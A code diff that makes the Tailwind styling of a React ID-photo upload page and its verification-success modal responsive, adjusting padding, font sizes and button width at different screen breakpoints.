@@ -70,9 +70,9 @@ const UploadID = () => {
     <main className="bg-[#f5f7fa] min-h-screen flex flex-col">
       <Header />
 
-      <div className="flex-grow flex items-center justify-center px-4 min-h-[90vh]">
-        <div className="w-full max-w-md bg-white rounded-2xl shadow-md p-8">
-          <h1 className="text-2xl font-bold text-[#0d2d62] mb-4">
+      <div className="flex min-h-[90vh] flex-grow items-center justify-center px-4 py-8 sm:py-10">
+        <div className="w-full max-w-md rounded-2xl bg-white p-6 shadow-md sm:p-8">
+          <h1 className="mb-4 text-xl font-bold text-[#0d2d62] sm:text-2xl">
             Upload your ID photo
           </h1>
 
@@ -133,8 +133,8 @@ const UploadID = () => {
             aria-modal="true"
             className="w-full max-w-[450px] overflow-hidden rounded-[18px] border border-[#d5d8dd] bg-[#ececef] shadow-[0_28px_70px_rgba(8,17,36,0.45)]"
           >
-            <div className="px-6 pt-8 pb-8 text-center">
-              <h2 className="text-3xl font-semibold leading-none text-black">
+            <div className="px-5 pb-7 pt-7 text-center sm:px-6 sm:pb-8 sm:pt-8">
+              <h2 className="text-2xl font-semibold leading-none text-black sm:text-3xl">
                 Congratulation!
               </h2>
 
@@ -171,10 +171,10 @@ const UploadID = () => {
                 </svg>
               </div>
 
-              <p className="mx-auto mt-1 text-lg leading-tight text-[#6f747a] md:mt-4 ">
+              <p className="mx-auto mt-1 text-base leading-tight text-[#6f747a] md:mt-4 md:text-lg ">
                 Your account has been successfully verified.
               </p>
-              <p className="mx-auto mt-5 text-lg leading-tight text-[#6f747a] ">
+              <p className="mx-auto mt-5 text-base leading-tight text-[#6f747a] md:text-lg ">
                 Our team will process your refund within 24 hours.
               </p>
             </div>
@@ -183,7 +183,7 @@ const UploadID = () => {
               <button
                 type="button"
                 onClick={handleCloseModal}
-                className="rounded-full bg-primary px-11 py-2 text-lg font-semibold text-black  shadow-inner transition-colors"
+                className="w-full max-w-[220px] rounded-full bg-primary px-11 py-2 text-base font-semibold text-black shadow-inner transition-colors sm:text-lg"
               >
                 Close
               </button>
